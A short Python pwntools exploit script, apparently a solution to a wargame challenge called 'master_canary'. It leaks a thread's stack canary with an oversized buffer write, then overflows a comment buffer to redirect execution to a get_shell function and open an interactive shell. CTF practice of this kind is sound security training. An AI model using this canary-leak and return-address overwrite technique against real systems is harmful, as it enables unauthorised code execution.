from pwn import *
exe = ELF("./master_canary", checksec = False)
# p = process(exe.path)
p = remote('host8.dreamhack.games',22118)

def create_thread():
  p.sendlineafter(b"> ", b"1")

def input_buf():
  payload = b"a"*2281
  p.sendlineafter(b"> ", b"2")
  p.sendlineafter(b"Size: ", b'2281')
  p.sendlineafter(b"Data: ", payload)

def exploit(canary):
  payload = b"a"*40 + p64(canary) + p64(0) + p64(0x400c88) + p64(exe.symbols["get_shell"])
  p.sendlineafter(b"> ", b"3")
  p.sendlineafter(b"Leave comment: ", payload)


# input()
create_thread()

input_buf()
p.recvuntil(b"Data: ")
p.recv(2281)
canary = u64(b"\x00"+ p.recv(7))
log.info("canary : "+ hex(canary))

exploit(canary)

p.interactive()